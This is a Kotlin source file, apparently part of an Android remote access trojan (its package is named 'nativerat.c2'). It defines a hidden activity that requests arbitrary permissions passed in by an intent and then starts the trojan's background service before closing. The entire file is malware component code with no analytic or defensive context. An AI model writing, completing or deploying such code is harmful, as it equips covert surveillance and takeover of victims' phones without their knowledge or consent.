package com.nativerat.c2

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle

class HiddenActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val perms = intent?.getStringArrayExtra("perms")
        if (perms != null && perms.isNotEmpty() && Build.VERSION.SDK_INT >= 23) {
            requestPermissions(perms, 100)
        } else {
            startService(Intent(this, MainService::class.java))
            finish()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        startService(Intent(this, MainService::class.java))
        finish()
    }
}